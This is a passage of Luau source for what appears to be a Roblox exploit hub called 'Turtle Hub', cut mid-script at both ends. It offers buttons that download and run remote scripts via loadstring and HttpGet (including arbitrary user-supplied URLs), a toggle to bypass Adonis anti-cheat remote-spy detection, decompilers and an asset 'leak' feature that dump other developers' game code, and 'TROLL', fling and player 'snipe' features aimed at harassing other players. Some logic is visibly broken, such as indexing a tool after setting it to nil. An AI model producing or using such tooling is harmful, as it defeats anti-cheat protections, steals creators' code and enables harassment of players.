		TTWToolDecal.Parent = game:GetService("ReplicatedStorage")
		TTWToolDecal.ToolTip = "Click anywhere to walk"
		local handleTTWDecal = Instance.new("Part")
		handleTTWDecal.Name = "Handle"
              	handleTTWDecal.Size = Vector3.new(1,1,1)
             	handleTTWDecal.BrickColor = BrickColor.new("Bright yellow")
              	handleTTWDecal.Anchored = false
              	handleTTWDecal.CanCollide = false
              	handleTTWDecal.Parent = TTWToolDecal
		--[[
		TTWToolDecal.Equipped:Connect(function()
			lib:notify(lib:ColorFonts("Tool is ready, click anywhere to walk","Bold,Green"),20)
		end)
		TTWToolDecal.Unequipped:Connect(function()
			lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
		end)
		TTWToolDecal.Activated:Connect(function()
			TurtleRemoteEvent:Fire("AI","walk",Vector3.new(Mouse.Hit.X,Mouse.Hit.Y,Mouse.Hit.Z))
		end)
		]]
	
		local T100 = window:Tab("Developer Access")
			local function getInstanceFromPath(path)
				local currentInstance = game
				for instanceName in string.gmatch(path,"[^.]+") do 
					currentInstance = currentInstance:FindFirstChild(instanceName)
					if not currentInstance then
						lib:notify(lib:ColorFonts("Instance tidak ditemukan: " .. instanceName,"Bold,Red"))
						return nil
					end
				end
				return currentInstance
			end
			
			if hidetab == false then
				T100:Button("Remote spy [ NEXT-GEN ]",function()
					lib:RemoteSpy("V4")
				end)

				T100:Button("Remote spy [ OLD ]",function()
					lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Jshdjdhdkdb/main/Omgshit.lua")
				end)

				T100:Toggle("Include BindableEvents [ Remote Spy ]",false,function(value)
					if getgenv and typeof(BooleanIncludeBindableRemotes) ~= "nil" then
						BooleanIncludeBindableRemotes = value
					else
						if value == true then
							TurtleScreenNotify("Turtle Client","Missing enviroment table",{},nil,{})
							TurtleFlags["Include BindableEvents [ Remote Spy ] • Turtle Interface"](false)
						end
					end
				end)
				--AdonisRemoteBypass

				T100:Toggle("Bypass Anti Remote-spy",false,function(value)
					if getgenv and typeof(AdonisRemoteBypass) ~= "nil" then
						AdonisRemoteBypass = value
					else
						if value == true then
							TurtleScreenNotify("Turtle Client","Missing enviroment table",{},nil,{})
							TurtleFlags["Bypass Anti Remote-spy • Turtle Interface"](false)
						end
					end
				end,"Only work for a game with adonis anti-cheat")
				
				T100:Button("Dex V1",function()
					TurtleScreenNotify("Turtle Confirmation | Are you sure?","Running Dex V1?",{"Yes"},nil,{
								Yes = function()
									lib:DEX()
								end
					})
				end)

				T100:Button("Dex V2",function()
					TurtleScreenNotify("Turtle Confirmation | Are you sure?","Running Dex V2?",{"Yes"},nil,{
								Yes = function()
									lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Elite-Script-Folder/main/dex.lua")
								end
					})
				end)
			
				T100:Button("Turtle explorer",function()
					lib:TurtleExplorer()
				end)

				T100:Button("Turtle Executor",function()
					lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Elite-Script-Folder/refs/heads/main/Psyhub-Interface-Theme-1.lua")
				end)

				T100:Button("Turtle Exploit V8 For Client-Side",function()
					lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Elite-Script-Folder/refs/heads/main/client-exec.lua")
				end,"Ported from Turtle Roblox Exploit")

				T100:Button("Turtle Exploit V8 For Server-Side",function()
					lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Elite-Script-Folder/refs/heads/main/server-exec.lua")
				end,"Ported from Turtle Roblox Exploit")

				T100:Button("Rejoin",function()
					lib:rejoin()
				end)
				
			end --TurtleFlags.ScreenClickForInGameScreenClick

		T100:Toggle("Screen Click [ Screen Corner ]",false,function(value)
			TurtleFlags.ScreenClickForInGameScreenClick = value
		end,"For a map that uses screen click")
		
		T100:Button("Lag patcher [ FPS & PING ]",function()
			lib:RevokeLag()
		end)
			
		T100:Button("Open console",function()
			StarterGui:SetCore("DevConsoleVisible",true)
		end)
			
		T100:Toggle("Enable reset buttons",false,function(value)
			StarterGui:SetCore("ResetButtonCallback",value)
		end)

		T100:Toggle("Auto Jump",false,function(value)
			TurtleFlags.UserJump = value
		end,`Good for {lib:ColorFonts("Nico's Nextbots","Bold,Green")}`)
			
		T100:Button("Sent all attributes",function()
			local attributeHandle = {}
			lib:attributes(LocalPlayer,function(name,value)
				table.insert(attributeHandle,`['{name}'] = {value}`)
			end)
			wait(0.5)
			if #attributeHandle > 0 then
				local tableToString = lib.parseData(attributeHandle,0,false,{},nil,false)
				lib.sentMessage(lib.getTable("sent","galau"),`local hooking_table = {tableToString}\n\nSuccess : [{#attributeHandle}]\nFailed : [{#attributeHandle * 2 / 1}]\nWarning : [{#attributeHandle * 1 + 2 / 2}]`)
				lib:Copy(table.concat(attributeHandle,", "))
			else
				lib:notify(lib:ColorFonts("No attributes were found.","Bold,Red"),10)
			end
		end) --lib.getHiddenConnection(b,get) TpToolDecal

		local IsEnabledTool = false
		local IsEnabledTool2 = false
		local ToolHandlerForEmergency = nil
		local ToolHandlerForEmergency2 = nil
		LocalPlayer.CharacterAdded:Connect(function(chr)
			if IsEnabledTool == true then
				if typeof(ToolHandlerForEmergency) ~= "nil" then
					ToolHandlerForEmergency.Parent = LocalPlayer.Backpack
					if #getconnections(ToolHandlerForEmergency.Equipped) > 0 and #getconnections(ToolHandlerForEmergency.Unequipped) > 0 and #getconnections(ToolHandlerForEmergency.Activated) > 0 then
						ToolHandlerForEmergency.Equipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool is ready, click anywhere to teleport","Bold,Green"),20)
						end)
						ToolHandlerForEmergency.Unequipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
						end)
						ToolHandlerForEmergency.Activated:Connect(function()
							local Char = LocalPlayer.Character or workspace:FindFirstChild(LocalPlayer.Name)
							local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
							if not Char or not HRP then
								lib:notify(lib:ColorFonts("Failed to find HumanoidRootPart","Bold,Red"),10)
							end
							HRP.CFrame = CFrame.new(Mouse.Hit.X,Mouse.Hit.Y + 3,Mouse.Hit.Z,select(4,HRP.CFrame:components()))
						end)
					end
				else
					ToolHandlerForEmergency = TpToolDecal:Clone()
					ToolHandlerForEmergency.Parent = LocalPlayer.Backpack
					ToolHandlerForEmergency.Equipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool is ready, click anywhere to teleport","Bold,Green"),20)
					end)
					ToolHandlerForEmergency.Unequipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
					end)
					ToolHandlerForEmergency.Activated:Connect(function()
						local Char = LocalPlayer.Character or workspace:FindFirstChild(LocalPlayer.Name)
						local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
						if not Char or not HRP then
							lib:notify(lib:ColorFonts("Failed to find HumanoidRootPart","Bold,Red"),10)
						end
						HRP.CFrame = CFrame.new(Mouse.Hit.X,Mouse.Hit.Y + 3,Mouse.Hit.Z,select(4,HRP.CFrame:components()))
					end)
				end
			end
			if IsEnabledTool2 == true then
				if typeof(ToolHandlerForEmergency2) ~= "nil" then
					ToolHandlerForEmergency2.Parent = LocalPlayer.Backpack
					if #getconnections(ToolHandlerForEmergency2.Equipped) > 0 and #getconnections(ToolHandlerForEmergency2.Unequipped) > 0 and #getconnections(ToolHandlerForEmergency2.Activated) > 0 then
						ToolHandlerForEmergency2.Equipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool is ready, click anywhere to walk","Bold,Green"),20)
						end)
						ToolHandlerForEmergency2.Unequipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
						end)
						ToolHandlerForEmergency2.Activated:Connect(function()
							TurtleRemoteEvent:Fire("AI","walk",Vector3.new(Mouse.Hit.X,Mouse.Hit.Y,Mouse.Hit.Z))
						end)
					end
				else
					ToolHandlerForEmergency2 = TTWToolDecal:Clone()
					ToolHandlerForEmergency2.Parent = LocalPlayer.Backpack
					ToolHandlerForEmergency2.Equipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool is ready, click anywhere to walk","Bold,Green"),20)
					end)
					ToolHandlerForEmergency2.Unequipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
					end)
					ToolHandlerForEmergency2.Activated:Connect(function()
						TurtleRemoteEvent:Fire("AI","walk",Vector3.new(Mouse.Hit.X,Mouse.Hit.Y,Mouse.Hit.Z))
					end)
				end
			end
		end)
		T100:Toggle("TP Tool",false,function(value)
			IsEnabledTool = value
			if value == true then
				if typeof(ToolHandlerForEmergency) ~= "nil" then
					ToolHandlerForEmergency.Parent = LocalPlayer.Backpack
					if #getconnections(ToolHandlerForEmergency.Equipped) > 0 and #getconnections(ToolHandlerForEmergency.Unequipped) > 0 and #getconnections(ToolHandlerForEmergency.Activated) > 0 then
						ToolHandlerForEmergency.Equipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool is ready, click anywhere to teleport","Bold,Green"),20)
						end)
						ToolHandlerForEmergency.Unequipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
						end)
						ToolHandlerForEmergency.Activated:Connect(function()
							local Char = LocalPlayer.Character or workspace:FindFirstChild(LocalPlayer.Name)
							local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
							if not Char or not HRP then
								lib:notify(lib:ColorFonts("Failed to find HumanoidRootPart","Bold,Red"),10)
							end
							HRP.CFrame = CFrame.new(Mouse.Hit.X,Mouse.Hit.Y + 3,Mouse.Hit.Z,select(4,HRP.CFrame:components()))
						end)
					end
				else
					ToolHandlerForEmergency = TpToolDecal:Clone()
					ToolHandlerForEmergency.Parent = LocalPlayer.Backpack
					ToolHandlerForEmergency.Equipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool is ready, click anywhere to teleport","Bold,Green"),20)
					end)
					ToolHandlerForEmergency.Unequipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
					end)
					ToolHandlerForEmergency.Activated:Connect(function()
						local Char = LocalPlayer.Character or workspace:FindFirstChild(LocalPlayer.Name)
						local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
						if not Char or not HRP then
							lib:notify(lib:ColorFonts("Failed to find HumanoidRootPart","Bold,Red"),10)
						end
						HRP.CFrame = CFrame.new(Mouse.Hit.X,Mouse.Hit.Y + 3,Mouse.Hit.Z,select(4,HRP.CFrame:components()))
					end)
				end
			elseif value == false then
				if typeof(ToolHandlerForEmergency) ~= "nil" then
					ToolHandlerForEmergency:Destroy()
					ToolHandlerForEmergency = nil
					if #getconnections(ToolHandlerForEmergency.Equipped) >= 1 and #getconnections(ToolHandlerForEmergency.Unequipped) >= 1 and #getconnections(ToolHandlerForEmergency.Activated) >= 1 then
						ToolHandlerForEmergency.Equipped:Disconnect()
						ToolHandlerForEmergency.Unequipped:Disconnect()
						ToolHandlerForEmergency.Activated:Disconnect()
					end
				end
			end
		end)

		T100:Toggle("Tap-To-Walk Tool",false,function(value)
			IsEnabledTool2 = value
			if value == true then
				if typeof(ToolHandlerForEmergency2) ~= "nil" then
					ToolHandlerForEmergency2.Parent = LocalPlayer.Backpack
					if #getconnections(ToolHandlerForEmergency2.Equipped) > 0 and #getconnections(ToolHandlerForEmergency2.Unequipped) > 0 and #getconnections(ToolHandlerForEmergency2.Activated) > 0 then
						ToolHandlerForEmergency2.Equipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool is ready, click anywhere to walk","Bold,Green"),20)
						end)
						ToolHandlerForEmergency2.Unequipped:Connect(function()
							lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
						end)
						ToolHandlerForEmergency2.Activated:Connect(function()
							TurtleRemoteEvent:Fire("AI","walk",Vector3.new(Mouse.Hit.X,Mouse.Hit.Y,Mouse.Hit.Z))
						end)
					end
				else
					ToolHandlerForEmergency2 = TTWToolDecal:Clone()
					ToolHandlerForEmergency2.Parent = LocalPlayer.Backpack
					ToolHandlerForEmergency2.Equipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool is ready, click anywhere to walk","Bold,Green"),20)
					end)
					ToolHandlerForEmergency2.Unequipped:Connect(function()
						lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
					end)
					ToolHandlerForEmergency2.Activated:Connect(function()
						TurtleRemoteEvent:Fire("AI","walk",Vector3.new(Mouse.Hit.X,Mouse.Hit.Y,Mouse.Hit.Z))
					end)
				end
			elseif value == false then
				if typeof(ToolHandlerForEmergency2) ~= "nil" then
					ToolHandlerForEmergency2:Destroy()
					ToolHandlerForEmergency2 = nil
					if #getconnections(ToolHandlerForEmergency2.Equipped) >= 1 and #getconnections(ToolHandlerForEmergency2.Unequipped) >= 1 and #getconnections(ToolHandlerForEmergency2.Activated) >= 1 then
						ToolHandlerForEmergency2.Equipped:Disconnect()
						ToolHandlerForEmergency2.Unequipped:Disconnect()
						ToolHandlerForEmergency2.Activated:Disconnect()
					end
				end
			end
		end)
			
		T100:Button("Sent all attributes",function()
			local attributeHandle = {}
			lib:attributes(LocalPlayer.Character,function(name,value)
				table.insert(attributeHandle,`['{name}'] = {value}`)
			end)
			wait(0.5)
			if #attributeHandle > 0 then
				local tableToString = lib.parseData(attributeHandle,0,false,{},nil,false)
				lib.sentMessage(lib.getTable("sent","galau"),`local hooking_table = {tableToString}\n\nSuccess : [{#attributeHandle}]\nFailed : [{#attributeHandle * 2 / 1}]\nWarning : [{#attributeHandle * 1 + 2 / 2}]`)
				lib:Copy(table.concat(attributeHandle,", "))
			else
				lib:notify(lib:ColorFonts("No attributes were found.","Bold,Red"),10)
			end
		end,"Catch all Character's Attributes")

		T100:Textbox("Run private repository link",false,function(value)
			lib:LoadRepository(value)
		end)

		T100:Textbox("Run script link",false,function(value)
			loadstring(game:HttpGet(value))()
		end)

		T100:Textbox("Run source script",false,function(value)
			loadstring(value)()
		end)

		T100:Textbox("Decompile using exploit decompiler",false,function(value)
			writefile(getInstanceFromPath(value).Name,decompile(getInstanceFromPath(value)))
			print(decompile(getInstanceFromPath(value)))
		end)

		T100:Textbox("Decompile using turtle decompiler",false,function(value)
			if TurtleDecompile then
				writefile(getInstanceFromPath(value).Name,TurtleDecompile(getInstanceFromPath(value)))
				print(TurtleDecompile(getInstanceFromPath(value)))
			else
				lib:notify(lib:ColorFonts('"TurtleDecompile" only available on Turtle Exploit',"Bold,Red"),10)
			end
		end)

		local GameEnv = window:Tab("TROLL")
		local versionHole = "V1"
		local PLAYERNAME = "me"
		local GarbageTypeTable = {}
		local annoytypefuck = "RING"
		local GarbageCollectorAmountMax = 1
		local IsHolyEnabled = false
		
		GameEnv:Slider("Radius",0,1000,radius,function(value)
			radius = value
		end)

		GameEnv:Slider("Height",0,1500,height,function(value)
			height = value
		end)

		GameEnv:Slider("Rotation Speed",0,25,rotationSpeed,function(value)
			rotationSpeed = value
		end)

		GameEnv:Slider("Attraction Strength",0,1500,attractionStrength,function(value)
			attractionStrength = value
		end)

		GameEnv:Textbox("Player",false,function(value)
			lib:TrackPlayer(value,function(v)
				PLAYERNAME = v.Name
				lib:notify(lib:ColorFonts(`Player found! {v.DisplayName} - (@{v.Name})`,"Bold,Green"),10)
			end)
		end)
			
		GameEnv:Toggle("START ANNOY",false,function(value)
			IsHolyEnabled = value
		end)

		local ScriptDump2 = window:Tab("Script Decompile")
		--local InjectionDecompile = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/Decompile/main/Mobile.lua"))()
		ScriptDump2:Textbox("Path to Decompile",false,function(value)
			TurtleFlags.PathDecompiler = value
		end)
			
		ScriptDump2:Dropdown("Select Decompiler",{"Exploit Decompiler","Turtle Decompile","Decompile 1","Decompile 2"},function(value)
			TurtleFlags.selectedDecompilerList = value
			if value == "Decompile 2" then
				task.spawn(function()
					TurtleFlags["getconstant desc"]("")
					TurtleFlags["getupvalues desc"]("")
					TurtleFlags["setclipboard desc"]("")
					wait(1)
					TurtleFlags["getconstant desc"]("⚠️ REQUIRED ⚠️")
					TurtleFlags["getupvalues desc"]("⚠️ REQUIRED ⚠️")
					TurtleFlags["setclipboard desc"]("⚠️ REQUIRED ⚠️")
				end)
			else
				task.spawn(function()
					TurtleFlags["getconstant desc"]("")
					TurtleFlags["getupvalues desc"]("")
					TurtleFlags["setclipboard desc"]("")
					wait(1)
					TurtleFlags["getconstant desc"]("⚠️ DOES NOT REQUIRED ⚠️")
					TurtleFlags["getupvalues desc"]("⚠️ DOES NOT REQUIRED ⚠️")
					TurtleFlags["setclipboard desc"]("⚠️ DOES NOT REQUIRED ⚠️")
				end)
			end
		end)

		ScriptDump2:Toggle("getconstant",false,function(value)
			InjectionDecompile.getconstants = value
		end,"⚠️ DOES NOT REQUIRED ⚠️")
			
		ScriptDump2:Toggle("getupvalues",false,function(value)
			InjectionDecompile.getupvalues = value
		end,"⚠️ DOES NOT REQUIRED ⚠️")
			
		ScriptDump2:Toggle("setclipboard",false,function(value)
			InjectionDecompile.setclipboard = value
		end,"⚠️ DOES NOT REQUIRED ⚠️")
	
		ScriptDump2:Toggle("Save to github",false,function(value)
			TurtleFlags.ToGithubDatabase = value
		end)
			
		ScriptDump2:Button("Start Decompile",function()
			if TurtleFlags.ToGithubDatabase == true then
				if TurtleFlags.selectedDecompilerList == "Exploit Decompiler" then
					CreateFile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,decompile(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Turtle Decompile" then
					CreateFile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,TurtleDecompile(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Decompile 1" then
					CreateFile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,"N/A") --Decompile2(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Decompile 2" then
					CreateFile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,InjectionDecompile.new(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				end
			else
				if TurtleFlags.selectedDecompilerList == "Exploit Decompiler" then
					writefile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,decompile(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Turtle Decompile" then
					writefile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,TurtleDecompile(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Decompile 1" then
					writefile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,"N/A") --Decompile2(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				elseif TurtleFlags.selectedDecompilerList == "Decompile 2" then
					writefile(getInstanceFromPath(TurtleFlags.PathDecompiler).Name,InjectionDecompile.new(getInstanceFromPath(TurtleFlags.PathDecompiler)))
				end
			end
		end)

		local GithubRepository = window:Tab("RBX Asset")
		local lastStrings = ""
		GithubRepository:Textbox("Leak code from asset id",false,function(value)
			if (game:GetObjects("rbxassetid://" .. value)[1].Source and game:GetObjects("rbxassetid://" .. value)[1].Source ~= nil) then
				if CreateFile and EditFile and typeof(CreateFile) == "function" and typeof(EditFile) == "function" then
					if value ~= lastStrings then
						CreateFile(value .. ".lua",game:GetObjects("rbxassetid://" .. value)[1].Source)
						lib:notify(lib:ColorFonts("File saved to " .. lib:ColorFonts(Exploit() .. "/Workspace/" .. value .. ".lua","Underline"),"Bold,Green"),10)
					else
						EditFile(value .. ".lua",game:GetObjects("rbxassetid://" .. value)[1].Source)
					end
				else
					TurtleScreenNotify("Turtle Github Repository Creator",`Failed to send request to github.\n\nReason [Function Check] [CreateFile]: {(CreateFile and "✓" or "X")}\nReason [Function Check] [EditFile]: {(EditFile and "✓" or "X")}\nFunction identity: CreateFile - {typeof(CreateFile)}, EditFile - {typeof(EditFile)}`,{},nil,{})
				end
			else
				TurtleScreenNotify("Turtle Hub | RBX Asset Deobfuscator","Only RBXASSETID are allowed to use this.",{},nil,{})
			end
		end)

		local FUPT = false
		local FUPT2 = false
		T100:Button("Fling unanchored part tool",function()
			if LocalPlayer.Backpack:FindFirstChild("Fling Tool") then
				LocalPlayer.Backpack["Fling Tool"]:Destroy()
			elseif LocalPlayer.Character:FindFirstChild("Fling Tool") then
				LocalPlayer.Character["Fling Tool"].Parent = LocalPlayer.Backpack
				wait(1)
				if LocalPlayer.Backpack:FindFirstChild("Fling Tool") then
					LocalPlayer.Backpack["Fling Tool"]:Destroy()
				else
					TurtleScreenNotify("Turtle Hub | Anti-Duplicate tool","A tool named 'Fling Tool' not found in LocalPlayer.Backpack",{"Force Delete"},nil,{
									["Force Delete"] = function()
										LocalPlayer.Character["Fling Tool"].Parent = LocalPlayer.Backpack
										wait(1)
										if LocalPlayer.Backpack:FindFirstChild("Fling Tool") then
											LocalPlayer.Backpack["Fling Tool"]:Destroy()
										else
											TurtleScreenNotify("Turtle Hub | Anti-Duplicate tool","Delete failed. tool not found in LocalPlayer.Character or in LocalPlayer.Backpack",{},nil,{})
										end
									end
					})
				end
			else
				local ft = Instance.new("Tool")
				ft.Name = "Fling Tool"
				ft.RequiresHandle = false
				ft.Parent = LocalPlayer.Backpack
				ft.Equipped:Connect(function()
					FUPT = true
				end)
				ft.Unequipped:Connect(function()
					FUPT = false
					lib:descendant(workspace,function(v)
						if v.Name == "NetworkOnwership" then
							v:Destroy()
						end
					end)
				end)
				ft.Activated:Connect(function()
					if Mouse.Target:IsA("BasePart") or Mouse.Target:IsA("Part") or Mouse.Target:IsA("MeshPart") or Mouse.Target:IsA("CornerWedgePart") or Mouse.Target:IsA("TrussPart") or Mouse.Target:IsA("WedgePart") then
						if Mouse.Target.Anchored == false then
							if Mouse.Target:FindFirstChild("NetworkOnwership") then
								TurtleScreenNotify("Turtle Hub | Fling-Unanchored Parts","This part has 'NetworkOwnership' enabled\nSelect another part with 'NetworkOwnership' disabled",{},nil,{})
							else
								local bambam = Instance.new("BodyAngularVelocity")
								bambam.Name = "NetworkOnwership"
								bambam.Parent = Mouse.Target
								bambam.AngularVelocity = Vector3.new(99999,99999,99999)
								bambam.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
								bambam.P = math.huge
								lib:notify(lib:ColorFonts("Success","Bold,Green"),10)
							end
						else
							TurtleScreenNotify("Turtle Hub | Fling-Unanchored Parts","This part has Anchored property enabled.\nSelect other part with Anchored disabled",{},nil,{})
						end
					end
				end)
			end
		end)

		T100:Button("Touch Fling",function()
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/ToggleFling/main/Roblox/Script.lua")
		end)

		T100:Button("Super Ring",function()
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Elite-Script-Folder/refs/heads/main/Super-Ring-Part.lua")
		end)

		T100:Toggle("FE Orbit Part",true,function(value)
			TurtleFlags.FEOrbitParts = value
		end,"FE RING PARTS")
					
		local T101 = window:Tab("Snipe")
		local var = {
			game_id = game.PlaceId,
			userid = LocalPlayer.UserId,
			channel = lib.getTable("sent","announcement"),
			user = lib.getUserTag("sent","@None"),
			sameserver = true,
			msg = "",
			bot = {
				channel = lib.getTable("sent","announcement"),
				user = lib.getUserTag("sent","@None"),
				name = "Unreal BOT",
				msg = ""
			}
		}

		T101:Toggle("Player in the same game/server",true,function(value)
			var.sameserver = value
		end,"if false, u need to type full name of the player username")
					
		T101:Textbox("Insert player name",false,function(value)
			--var.userid = value
			if var.sameserver == true then
				lib:TrackPlayer(value,function(v)
					lib:notify(lib:ColorFonts(`Player Found! {v.DisplayName} - (@{v.Name})`,"Bold,Green"),10)
					var.userid = game:GetService("Players"):GetUserIdFromNameAsync(v.Name)
				end)
			else
				var.userid = game:GetService("Players"):GetUserIdFromNameAsync(value)
			end
		end)
		TurtleFlags["Insert player name desc"]("Type player name to sniping [ Powered by AI ]")
			
		T101:Textbox("Insert game ID",false,function(value)
			var.game_id = value
		end)

		T101:Button("Start snipe",function()
			lib.snipe(var.game_id,var.userid)
		end,"May not work depends on API")

		T101:Button("Start snipe",function()
			if var.userid ~= LocalPlayer.UserId then
				if var.sameserver == true then
					lib:children(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data,function() -- for _,v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
						if typeof(playerIds) == "table" then
							if table.find(v.playerIds,var.userid) then
								lib:notify(lib:ColorFonts("Player Found! Starting teleport.","Bold,Green"),10)
								TeleportService:TeleportToPlaceInstance(game.PlaceId,v.id,LocalPlayer)
							else
								lib:notify(lib:ColorFonts('cant find player with that UserId in this experience with ServerAPI',"Bold,Red"),10)
							end
						else
							lib:notify(lib:ColorFonts('table with name "playerIds" isnt found in ServerAPI',"Bold,Red"),10)
						end
					end)
				else
					lib:children(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. var.game_id .. "/servers/Public?sortOrder=Asc&limit=100")).data,function() -- for _,v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
						if typeof(playerIds) == "table" then
							if table.find(v.playerIds,var.userid) then
								lib:notify(lib:ColorFonts("Player Found! Starting teleport.","Bold,Green"),10)
								TeleportService:TeleportToPlaceInstance(var.game_id,v.id,LocalPlayer)
							else
								lib:notify(lib:ColorFonts('cant find player with that UserId in that experience with ServerAPI',"Bold,Red"),10)
							end
						else
							lib:notify(lib:ColorFonts('table with name "playerIds" isnt found in ServerAPI',"Bold,Red"),10)
						end
					end)
				end
			else
				lib:notify(lib:ColorFonts("UserId must be another player's id, not urs.","Bold,Red"),10)
			end
		end,"sometimes work but sometime not")
					
		local musiclib = window:Tab("Music")
		local musicplayer = nil
		local musichand = {
				music = {},
				curr = 0,
				min = 0,
				max = 0,
				id = "0",
				musiclist = {
						["Christmas Song"] = "1839285792",
						["You And Me"] = "1841296740",
						["We're Running Wild"] = "1842104602",
						["Got Me Like"] = "9038571012",
						["Braziliana"] = "1840302441",
						["Summer Flow 60"] = "1836568924",
						["Flying To Space"] = "1835680814"
						
				},
				musicsavedlist = {"Christmas Song","You And Me","We're Running Wild","Got Me Like","Braziliana","Summer Flow 60","Flying To Space"}
		}
		musiclib:Textbox("Insert music id",false,function(value)
			lib:AddTable(value,musichand.music)
			musichand.curr = musichand.curr + 1
			musichand.max = musichand.max + 1
			if musicplayer ~= nil then
				musicplayer["SoundId"] = "rbxassetid://" .. value
				TurtleScreenNotify("Turtle Hub | Current Playing • Music",`Name : {MarketplaceService:GetProductInfo(tonumber(value)).Name}\nSound Id : {value}\nLength : {musicplayer["TimeLength"]}`,{},nil,{})
			else
				musichand.id = value
			end
		end)

		musiclib:Dropdown("Music List [ From Turtle-Music-Library ]",musichand.musicsavedlist,function(value)
			if musicplayer ~= nil then
				musicplayer["SoundId"] = "rbxassetid://" .. musichand.musiclist[value]
				TurtleScreenNotify("Turtle Hub | Current Playing • Music",`Name : {MarketplaceService:GetProductInfo(tonumber(musichand.musiclist[value])).Name}\nSound Id : {musichand.musiclist[value]}\nLength : {math.floor(musicplayer["TimeLength"])}`,{},nil,{})
			else
				musichand.id = musichand.musiclist[value]
			end
		end)
				
		musiclib:Toggle("Play music",false,function(value)
					if musicplayer == nil then
						musicplayer = Instance.new("Sound")
						musicplayer.Name = "TurtleMusic"
						musicplayer.SoundId = "rbxassetid://" .. musichand.id
						musicplayer.Volume = 1
						musicplayer.PlaybackSpeed = 1
						musicplayer.Looped = true
						musicplayer.TimePosition = 0
						musicplayer.Pitch = 1
						musicplayer.RollOffMode = Enum.RollOffMode["Linear"]
						musicplayer.RollOffMaxDistance = 10000
						musicplayer.RollOffMinDistance = 10
						musicplayer.EmitterSize = 5
						musicplayer.SoundGroup = nil
						musicplayer.Parent = game:GetService("ReplicatedStorage")
					end
					if value == true then
						if musicplayer ~= nil then
							musicplayer:Play()
							TurtleScreenNotify("Turtle Hub | Current Playing • Music",`Name : {MarketplaceService:GetProductInfo(tonumber(musichand.id)).Name}\nSound Id : {musichand.id}\nLength : {math.floor(musicplayer["TimeLength"])}`,{},nil,{})
						else
							TurtleScreenNotify("Turtle Hub | Error While Playing • Music",`Theres was a problem when playing the sound`,{},nil,{})
						end
					else
						if musicplayer ~= nil then
							musicplayer:Stop()
							TurtleScreenNotify("Turtle Hub | Music",`Music Stopped`,{},nil,{})
						else
							TurtleScreenNotify("Turtle Hub | Error While Playing • Music",`Theres was a problem when stopping the sound`,{},nil,{})
						end
					end
		end)
		musiclib:Button("Next music",function()
					if musicplayer ~= nil then
						musichand.curr = musichand.curr + 1
						TurtleScreenNotify("Turtle Hub | Current Playing • Music",`Name : {MarketplaceService:GetProductInfo(tonumber(musichand.music[musichand.curr])).Name}\nSound Id : {musichand.music[musichand.curr]}\nLength : {musicplayer["TimeLength"]}`,{},nil,{})
						if musichand.curr < musichand.max then
							musicplayer["SoundId"] = musichand.music[musichand.curr]
						else
							TurtleScreenNotify("Turtle Hub | Music","You've reached the last music!",{},nil,{})
						end
					end
		end)
		musiclib:Button("Previous music",function()
					if musicplayer ~= nil then
						musichand.curr = musichand.curr + -1
						TurtleScreenNotify("Turtle Hub | Current Playing • Music",`Name : {MarketplaceService:GetProductInfo(tonumber(musichand.music[musichand.curr])).Name}\nSound Id : {musichand.music[musichand.curr]}\nLength : {musicplayer["TimeLength"]}`,{},nil,{})
						if musichand.curr > musichand.min then
